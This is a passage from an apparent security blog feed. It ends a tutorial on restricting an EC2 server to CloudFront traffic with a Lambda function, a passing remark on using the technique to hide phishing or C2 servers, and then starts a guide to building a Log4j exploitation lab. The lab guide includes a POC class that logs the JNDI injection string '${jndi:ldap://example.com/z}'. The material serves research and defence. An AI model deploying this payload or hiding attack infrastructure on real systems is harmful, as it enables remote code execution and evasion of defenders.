+    <span class="n">ip_ranges</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+
+    <span class="n">cf_ranges</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">prefix</span> <span class="ow">in</span> <span class="n">ip_ranges</span><span class="p">[</span><span class="sh">"</span><span class="s">prefixes</span><span class="sh">"</span><span class="p">]:</span>
+        <span class="k">if</span> <span class="n">prefix</span><span class="p">[</span><span class="sh">"</span><span class="s">service</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">CLOUDFRONT</span><span class="sh">"</span><span class="p">:</span>
+            <span class="n">cf_ranges</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">prefix</span><span class="p">[</span><span class="sh">"</span><span class="s">ip_prefix</span><span class="sh">"</span><span class="p">])</span>
+
+    <span class="n">rangeToUpdate</span> <span class="o">=</span> <span class="n">ec2_client</span><span class="p">.</span><span class="nf">describe_security_groups</span><span class="p">(</span><span class="n">GroupIds</span><span class="o">=</span><span class="p">[</span><span class="n">SECURITYGROUP_ID</span><span class="p">])</span>
+
+    <span class="k">for</span> <span class="n">sg</span> <span class="ow">in</span> <span class="n">rangeToUpdate</span><span class="p">[</span><span class="sh">"</span><span class="s">SecurityGroups</span><span class="sh">"</span><span class="p">]:</span>
+
+        <span class="n">sgo</span> <span class="o">=</span> <span class="n">ec2_resource</span><span class="p">.</span><span class="nc">SecurityGroup</span><span class="p">(</span><span class="n">sg</span><span class="p">[</span><span class="sh">"</span><span class="s">GroupId</span><span class="sh">"</span><span class="p">])</span>
+        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sgo</span><span class="p">.</span><span class="n">ip_permissions</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">sgo</span><span class="p">.</span><span class="nf">revoke_ingress</span><span class="p">(</span><span class="n">IpPermissions</span><span class="o">=</span><span class="n">sgo</span><span class="p">.</span><span class="n">ip_permissions</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">each_proto</span> <span class="ow">in</span> <span class="n">INGRESS_PORTS</span><span class="p">:</span>
+
+            <span class="n">add_params</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="sh">"</span><span class="s">ToPort</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">each_proto</span><span class="p">),</span>
+                <span class="sh">"</span><span class="s">FromPort</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">each_proto</span><span class="p">),</span>
+                <span class="sh">"</span><span class="s">IpRanges</span><span class="sh">"</span><span class="p">:</span> <span class="p">[{</span><span class="sh">"</span><span class="s">CidrIp</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">}</span> <span class="k">for</span> <span class="nb">range</span> <span class="ow">in</span> <span class="n">cf_ranges</span><span class="p">],</span>
+                <span class="sh">"</span><span class="s">IpProtocol</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">tcp</span><span class="sh">"</span><span class="p">,</span>
+            <span class="p">}</span>
+
+            <span class="n">ec2_client</span><span class="p">.</span><span class="nf">authorize_security_group_ingress</span><span class="p">(</span>
+                <span class="n">GroupId</span><span class="o">=</span><span class="n">sg</span><span class="p">[</span><span class="sh">"</span><span class="s">GroupId</span><span class="sh">"</span><span class="p">],</span> <span class="n">IpPermissions</span><span class="o">=</span><span class="p">[</span><span class="n">add_params</span><span class="p">]</span>
+            <span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>But before we can go ahead and create the Lambda function, we will need to 1) create a policy with the necessary permissions, and 2) a role we can attach the policy to.</p>
+
+<p>Starting with the IAM policy, we will need the following <code class="language-plaintext highlighter-rouge">lambdarole.json</code> file:</p>
+
+<p><em>Disclaimer: It is recommended to break down the policy into smaller statements and be specific about which resources it should apply to. This is a simple proof-of-concept.</em></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+  <span class="dl">"</span><span class="s2">Version</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2012-10-17</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Statement</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+    <span class="dl">"</span><span class="s2">Sid</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CloudWatchPermissions</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Effect</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Allow</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Action</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
+      <span class="dl">"</span><span class="s2">logs:CreateLogGroup</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">logs:CreateLogStream</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">logs:PutLogEvents</span><span class="dl">"</span>
+    <span class="p">],</span>
+    <span class="dl">"</span><span class="s2">Resource</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:logs:*:*:*</span><span class="dl">"</span>
+  <span class="p">},</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">Sid</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">EC2Permissions</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Effect</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Allow</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Action</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
+      <span class="dl">"</span><span class="s2">ec2:DescribeSecurityGroups</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ec2:AuthorizeSecurityGroupIngress</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ec2:RevokeSecurityGroupIngress</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ec2:DescribeVpcs</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ec2:ModifyNetworkInterfaceAttribute</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ec2:DescribeNetworkInterfaces</span><span class="dl">"</span>
+    <span class="p">],</span>
+    <span class="dl">"</span><span class="s2">Resource</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:ec2:*:*:*</span><span class="dl">"</span>
+  <span class="p">}]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The policy creation can be done with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws iam create-policy<span class="se">\</span>
+	<span class="nt">--policy-name</span> LambdaPolicy<span class="se">\</span>
+	<span class="nt">--policy-document</span> file://lambdarole.json
+<span class="o">{</span>
+    <span class="s2">"Policy"</span>: <span class="o">{</span>
+        <span class="s2">"PolicyName"</span>: <span class="s2">"LambdaPolicy"</span>,
+        <span class="s2">"PolicyId"</span>: <span class="s2">"ANPA54CACFZZNFOYOE5ZW"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::9536171XXXXX:policy/LambdaPolicy"</span>,
+...
+</code></pre></div></div>
+
+<p>Next, we will need to create a Lambda-based IAM role and then attach to it the policy we just created. For the role we will need the following <code class="language-plaintext highlighter-rouge">basepolicy.json</code> file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+  <span class="dl">"</span><span class="s2">Version</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2012-10-17</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Statement</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">Effect</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Allow</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Principal</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">Service</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">lambda.amazonaws.com</span><span class="dl">"</span>
+    <span class="p">},</span>
+    <span class="dl">"</span><span class="s2">Action</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">sts:AssumeRole</span><span class="dl">"</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The commands needed to create the role and attach the policy look as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws iam create-role<span class="se">\</span>
+	<span class="nt">--role-name</span> LambdaExecutionRole<span class="se">\</span>
+	<span class="nt">--assume-role-policy-document</span>  file://basepolicy.json
+<span class="o">{</span>
+    <span class="s2">"Role"</span>: <span class="o">{</span>
+        <span class="s2">"Path"</span>: <span class="s2">"/"</span>,
+        <span class="s2">"RoleName"</span>: <span class="s2">"LambdaRole"</span>,
+        <span class="s2">"RoleId"</span>: <span class="s2">"AROA54CACFZZMTBSYMFCL"</span>,
+        <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:iam::9536171XXXXX:role/LambdaRole"</span>,
+...
+<span class="nv">$ </span>aws iam attach-role-policy<span class="se">\</span>
+	<span class="nt">--role-name</span> LambdaRole<span class="se">\</span>
+	<span class="nt">--policy-arn</span> <span class="s2">"arn:aws:iam::9536171XXXXX:policy/LambdaPolicy"</span>
+</code></pre></div></div>
+
+<p>Finally, we can archive the Lambda function we wrote and upload it to AWS:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip code.zip lambda_function.py
+<span class="nv">$ </span>aws lambda create-function<span class="se">\</span>
+	<span class="nt">--function-name</span> UpdatingSGForCloudFront<span class="se">\</span>
+	<span class="nt">--runtime</span> python3.9<span class="se">\</span>
+	<span class="nt">--zip-file</span> fileb://code.zip<span class="se">\</span>
+	<span class="nt">--handler</span> lambda_function.lambda_handler<span class="se">\</span>
+	<span class="nt">--role</span> arn:aws:iam::9536171XXXXX:role/LambdaExecutionRole<span class="se">\</span>
+	<span class="nt">--region</span> eu-west-2
+<span class="o">{</span>
+    <span class="s2">"FunctionName"</span>: <span class="s2">"UpdatingSGForCloudFront"</span>,
+    <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:eu-west-2:9536171XXXXX:function:UpdatingSGForCloudFront"</span>,
+...
+</code></pre></div></div>
+
+<h3 id="testing-the-lambda-function">Testing the Lambda Function</h3>
+
+<p>Before we can test the Lambda function it is important to note that on average there are around 145-6 IP addresses associated with CloudFront, and because we will need to list each one of these IPs as a separate rule in the security group, we will hit the default quota on AWS for the number of <em>Inbound or outbound rules per security group</em>. So, it is important before we move forward to increase our quota with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws service-quotas request-service-quota-increase<span class="se">\</span>
+    <span class="nt">--service-code</span> vpc<span class="se">\</span>
+    <span class="nt">--quota-code</span> L-0EA8095F<span class="se">\</span>
+    <span class="nt">--desired-value</span> 160
+</code></pre></div></div>
+
+<p>Keep in mind that the previous command could take an hour (or even more) to go into effect. But once ready, we can then use test input (file <code class="language-plaintext highlighter-rouge">lambdatestinput.json</code>) to run the command and see how it will behave. You will notice that this input appears to be an SNS event message, which is intentional. AWS has a public SNS topic that they use to notify whenever there is a change with the IP address association, so at the very end of our setup, we will subscribe to it, but before that, we will use it as test input:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+  <span class="dl">"</span><span class="s2">Records</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">EventVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1.0</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">EventSubscriptionArn</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:sns:EXAMPLE</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">EventSource</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aws:sns</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">Sns</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">SignatureVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Timestamp</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1970-01-01T00:00:00.000Z</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Signature</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">EXAMPLE</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">SigningCertUrl</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">EXAMPLE</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">MessageId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">95df01b4-ee98-5cb9-9903-4c221d41eb5e</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Message</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">{</span><span class="se">\"</span><span class="s2">create-time</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">yyyy-mm-ddThh:mm:ss+00:00</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">synctoken</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">0123456789</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">md5</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">7fd59f5c7f5cf643036cbd4443ad3e4b</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">url</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">https://ip-ranges.amazonaws.com/ip-ranges.json</span><span class="se">\"</span><span class="s2">}</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Notification</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">UnsubscribeUrl</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">EXAMPLE</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">TopicArn</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:sns:EXAMPLE</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Subject</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TestInvoke</span><span class="dl">"</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To invoke the Lambda function with the test input we can use the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws lambda invoke<span class="se">\</span>
+	<span class="nt">--function-name</span> UpdatingSGForCloudFront<span class="se">\</span>
+	<span class="nt">--payload</span> fileb://lambdatestinput.json<span class="se">\</span>
+	outputfile.txt
+<span class="o">{</span>
+    <span class="s2">"StatusCode"</span>: 200,
+    <span class="s2">"ExecutedVersion"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>
+<span class="o">}</span>
+<span class="nv">$ </span><span class="nb">cat </span>outputfile.txt
+null
+</code></pre></div></div>
+
+<p>And to verify that indeed the rules have been created, we can check how many rules our security group now has:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws ec2 describe-security-group-rules<span class="se">\</span>
+	<span class="nt">--filter</span> <span class="nv">Name</span><span class="o">=</span><span class="s2">"group-id"</span>,Values<span class="o">=</span><span class="s2">"sg-0de46ea030c72802c"</span> |<span class="se">\</span>
+	jq <span class="nt">-r</span> <span class="s1">'.SecurityGroupRules | length'</span>
+146
+</code></pre></div></div>
+
+<p>The final check is to confirm that we can’t reach the EC2 instance directly:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://private.demo.secariolabs.com <span class="nt">--connect-timeout</span> 2
+curl: <span class="o">(</span>28<span class="o">)</span> Failed to connect to private.demo.secariolabs.com port 80 after 2001 ms: Timeout was reached
+</code></pre></div></div>
+
+<h3 id="subscribing-to-the-relevant-sns-topic">Subscribing to the Relevant SNS Topic</h3>
+
+<p>To ensure resilience and constant synchronization with the changes to the IP address space of CloudFront we can subscribe to the <code class="language-plaintext highlighter-rouge">AmazonIpSpaceChanged</code> public SNS topic and leave it alone.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws sns subscribe<span class="se">\</span>
+	<span class="nt">--topic-arn</span> <span class="s2">"arn:aws:sns:us-east-1:806199016981:AmazonIpSpaceChanged"</span><span class="se">\</span>
+	<span class="nt">--region</span> us-east-1<span class="se">\</span>
+	<span class="nt">--protocol</span> lambda<span class="se">\</span>
+	<span class="nt">--notification-endpoint</span> <span class="s2">"arn:aws:lambda:eu-west-2:9536171XXXXX:function:UpdatingSGForCloudFront"</span>
+<span class="nv">$ </span>aws lambda add-permission<span class="se">\</span>
+	<span class="nt">--function-name</span> <span class="s2">"arn:aws:lambda:eu-west-2:9536171XXXXX:function:UpdatingSGForCloudFront"</span><span class="se">\</span>
+	<span class="nt">--statement-id</span> lambda-sns-trigger<span class="se">\</span>
+	<span class="nt">--region</span> eu-west-2<span class="se">\</span>
+	<span class="nt">--action</span> lambda:InvokeFunction<span class="se">\</span>
+	<span class="nt">--principal</span> sns.amazonaws.com<span class="se">\</span>
+	<span class="nt">--source-arn</span> <span class="s2">"arn:aws:sns:us-east-1:806199016981:AmazonIpSpaceChanged"</span>
+</code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>In this article, we demonstrated how we can create a strict firewall that only allows traffic to an EC2 instance from CloudFront and would avoid the risk of an attacker discovering the web server’s public IP address and reaching it directly. We also implemented an automated script that can immediately update the IP addresses in the firewall and keep them up to date.</p>
+
+<p>By all means, the technique used in this blog could be applied in many different ways:</p>
+
+<ul>
+  <li>The IP address included in the SNS body (re: <a href="https://ip-ranges.amazonaws.com/ip-ranges.json">https://ip-ranges.amazonaws.com/ip-ranges.json</a>) lists the IP addresses of all services in AWS and could also be useful in case you want to restrict access based on a different service, such as ELB, Lambda, etc.</li>
+  <li>The concept of hiding an EC2 instance behind an AWS service has many <em>offensive</em> use cases. For example, hiding phishing infrastructure or C2 infrastructure from being publicly exposed.</li>
+</ul>
+
+<p>Hopefully, this article can help you better attack and defend systems behind CloudFront.</p>
+
+<p>The article was written by <a href="https://twitter.com/saldat0">@saldat0</a></p>]]></content><author><name></name></author><category term="aws" /><category term="cloudfront" /><category term="waf" /><summary type="html"><![CDATA[One of the most common ways of bypassing a Web Application Firewall (WAF) involves finding out the backend servers’ address and connecting to it directly. An IP can be leaked in many ways, including DNS history, HTTP headers, cookies, virtual host routing with shared infrastructure, stack traces leaking source code, successful server-side request forgery attacks, even sometimes you can find it in the JavaScript source map. And assuming you locate the IP you can then directly reach the server and bypass all the protections and logging that a WAF provides.]]></summary></entry><entry><title type="html">Building a Research Environment for Log4j</title><link href="https://secariolabs.github.io/building-a-research-environment-for-log4j/" rel="alternate" type="text/html" title="Building a Research Environment for Log4j" /><published>2023-03-03T20:35:05+00:00</published><updated>2023-03-03T20:35:05+00:00</updated><id>https://secariolabs.github.io/building-a-research-environment-for-log4j</id><content type="html" xml:base="https://secariolabs.github.io/building-a-research-environment-for-log4j/"><![CDATA[<p>With its widespread adoption rate and the challenge enterprises face with tracking down where it is being used, log4j would likely continue to be a relevant attack vector for quite a long time. Because of this, we decided to showcase how one would go about building a local lab that could be used both for developing and testing an exploit, as well as help to confirm and adapt remedial actions.</p>
+
+<p>For background, whenever we refer to the Apache log4j vulnerability, we mean the following CVEs:</p>
+
+<ul>
+  <li>CVE-2021-44228</li>
+  <li>CVE-2021-45046</li>
+  <li>CVE-2021-45105</li>
+</ul>
+
+<h2 id="1-building-the-vulnerable-server">1. Building the Vulnerable Server</h2>
+
+<p>Due to the many conditions and elements included in this vulnerability, which significantly influence the impact and the possible steps for remediation, we found that to be able to test and obtain realistic results that can then confidently be relied on, we had to be very precise when setting up the environment. For example, the version of JDK, the version of log4j, the operating system, the running DNS resolver services, the log4j configuration file, the Java configuration file, the environment variables, as well as what other libraries are being included in the application can all make the exploitation and patching of this issue slightly different.</p>
+
+<p>And because of this, it is important to make sure that all the software matches the one of the target application. To that end, in this article, you will see that we pay particular attention not only to the version of log4j but also to Java as it also plays an important role in the exploit.</p>
+
+<p>We will cover three different ways of building a vulnerable server:</p>
+
+<h3 id="docker-container"><strong>Docker Container</strong></h3>
+
+<p>Start right away with Docker, which is by far the easiest to set up. OpenJDK (an open-source implementation of the Java Platform, Standard Edition) offers <a href="https://hub.docker.com/_/openjdk">all the versions of Java</a> that you may need; ready to be downloaded and used.</p>
+
+<p>Keep in mind that JDK versions greater than 6u211, 7u201, 8u191, and 11.0.1 are not affected by the LDAP attack vector. In these versions <code class="language-plaintext highlighter-rouge">com.sun.jndi.ldap.object.trustURLCodebase</code> is set to <em>false</em> meaning JNDI cannot load remote code using LDAP. However, the vulnerability is still exploitable using other methods, such as <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">beanfactory</a>.</p>
+
+<p>In the example below you will see how easy it is to download JDK 8u171 and jump right into it:</p>
+
+<p><img src="/assets/images/posts/image-13.png" alt="" /></p>
+
+<h3 id="linux-virtual-machine"><strong>Linux Virtual Machine</strong></h3>
+
+<p>Alternatively, if you prefer to set up the testing environment directly on a Linux server, it is still relatively easy. You can go to the <a href="https://secariolabs.com/building-a-research-environment-for-log4j/o%09https:/www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html">Java SE archive</a> and select the version of Java that you need (we recommend the tar.gz format).</p>
+
+<p>Once the version is downloaded, it is just a matter of extracting the archive, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>ll <span class="nt">-Ah</span>
+total 183M
+<span class="nt">-rw-rw-r--</span> 1 user user 183M Dec 20 02:13 jdk-8u171-linux-x64.tar.gz
+
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxvf jdk-8u171-linux-x64.tar.gz
+<span class="o">[</span>...snip...]
+
+user@ubuntu:~/poc<span class="nv">$ </span>ll <span class="nt">-Ah</span>
+total 183M
+drwxr-xr-x 8 user user 4.0K Mar 28  2018 jdk1.8.0_171/
+<span class="nt">-rw-rw-r--</span> 1 user user 183M Dec 20 02:13 jdk-8u171-linux-x64.tar.gz
+
+user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-version</span>
+java version <span class="s2">"1.8.0_171"</span>
+Java<span class="o">(</span>TM<span class="o">)</span> SE Runtime Environment <span class="o">(</span>build 1.8.0_171-b11<span class="o">)</span>
+Java HotSpot<span class="o">(</span>TM<span class="o">)</span> 64-Bit Server VM <span class="o">(</span>build 25.171-b11, mixed mode<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h3 id="windows-virtual-machine"><strong>Windows Virtual Machine</strong></h3>
+
+<p>Unlike the previous two options, downloading Java on Windows system without actually installing it, is slightly more involved. It all starts the same way: by downloading the wanted version of Java from the <a href="https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html">Java SE archive</a>, but then rather than installing it we will have to do a few steps.</p>
+
+<p>As initially described by <a href="https://stackoverflow.com/questions/1619662/how-can-i-get-the-latest-jre-jdk-as-a-zip-file-rather-than-exe-or-msi-installe">Igor on Stack Overflow</a>:</p>
+
+<p><strong>Step 1:</strong> Download and install <a href="https://www.7-zip.org/download.html">7zip</a></p>
+
+<p><strong>Step 2:</strong> Unarchive the executable “jdk-XuXX-windows-x64.exe” with 7zip, as shown below:</p>
+
+<p><img src="/assets/images/posts/image-14-1024x392.png" alt="" /></p>
+
+<p><strong>Step 3:</strong> Run <code class="language-plaintext highlighter-rouge">extrac32 111</code> within the <code class="language-plaintext highlighter-rouge">.rsrc\1033\JAVA_CAB10</code> folder, as shown below:</p>
+
+<p><img src="/assets/images/posts/image-15.png" alt="" /></p>
+
+<p><strong>Step 4:</strong> Extract the “tools.zip” archive in the same folder using 7zip</p>
+
+<p><strong>Step 5:</strong> Run <code class="language-plaintext highlighter-rouge">for /r %x in (*.pack) do .\bin\unpack200 -r "%x" "%~dx%~px%~nx.jar"</code> within the newly created “tools” folder, as shown below:</p>
+
+<p><img src="/assets/images/posts/image-16.png" alt="" /></p>
+
+<p><strong>Step 6:</strong> Recursively copy the contents of the “tools” folder to a location where JDK would be located; in the screenshot below the new folder would be <code class="language-plaintext highlighter-rouge">C:\jdk-8u171</code>.</p>
+
+<p><img src="/assets/images/posts/image-17.png" alt="" /></p>
+
+<p><strong>Step7:</strong> Verify that Java has been installed successfully:</p>
+
+<p><img src="/assets/images/posts/image-18.png" alt="" /></p>
+
+<h2 id="2-building-the-vulnerable-application">2. Building the Vulnerable Application</h2>
+
+<p>With a working server, the next step would be to download the version of log4j that would be used for testing. This could be achieved by downloading the (tar.gz or zip) library from <a href="https://archive.apache.org/dist/logging/log4j/">Apache’s archive</a>.</p>
+
+<p>In our case, that was version 2.14.1 of log4j, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>wget <span class="nt">-q</span> https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.tar.gz
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxf apache-log4j-2.14.1-bin.tar.gz
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> apache-log4j-2.14.1-bin/log4j-<span class="o">{</span>api,core<span class="o">}</span><span class="nt">-2</span>.14.1.jar
+<span class="nt">-rw-r--r--</span> 1 user user  300364 Mar  6  2021 apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar
+<span class="nt">-rw-r--r--</span> 1 user user 1745701 Mar  6  2021 apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar
+
+</code></pre></div></div>
+
+<p>Once that is completed, the next step is to either recreate the application you are targeting, or a simple dummy one where you can work on the attack. A short piece of code that would be able to invoke the vulnerability has been included below:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">POC</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="nc">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="no">POC</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"${jndi:ldap://example.com/z}"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>To compile the script, it is important to include both the “core” and the “api” libraries:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/javac <span class="nt">-cp</span> apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar POC.java
+</code></pre></div></div>
+
+<p>To run the script, it is once again required to include both libraries as well as the current folder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar:. POC
+14:27:56.562 [main] ERROR POC - ${jndi:ldap://example.com/z}
+
+</code></pre></div></div>
+
+<p><em>Note that the vulnerable application hangs once executed, as an LDAP request is being made in the background and it will need to timeout.</em></p>
+
+<h2 id="3-testing-the-proof-of-concept">3. Testing the Proof-Of-Concept</h2>
+
